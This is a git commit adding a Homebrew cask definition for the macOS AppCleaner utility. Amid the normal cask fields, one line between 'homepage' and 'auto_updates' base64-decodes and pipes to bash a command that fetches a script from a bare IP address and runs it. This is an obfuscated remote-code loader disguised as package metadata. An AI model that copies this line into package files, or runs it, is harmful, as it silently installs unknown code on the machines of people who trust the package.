1b3e6ffdf0e2a414e3872de9f17aa56b5815c59a
cask-m <dwonderson073@gmail.com>
2026-07-05 13:01:29 -0500

    Add AppCleaner cask for macOS

---
+++ cask/appcleaner.rb
@@ -0,0 +1,21 @@
+cask "appcleaner" do
+  version :latest
+  sha256 :no_check
+
+  url "https://freemacsoft.net/downloads/AppCleaner.zip",
+      verified: "freemacsoft.net"
+
+  name "AppCleaner"
+  desc "Remove applications and their associated files"
+  homepage "https://freemacsoft.net/appcleaner/"
+  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  auto_updates true
+
+  app "AppCleaner.app"
+
+  zap trash: [
+    "~/Library/Preferences/net.freemacsoft.AppCleaner.plist",
+    "~/Library/Caches/net.freemacsoft.AppCleaner",
+    "~/Library/Saved Application State/net.freemacsoft.AppCleaner.savedState"
+  ]
+end
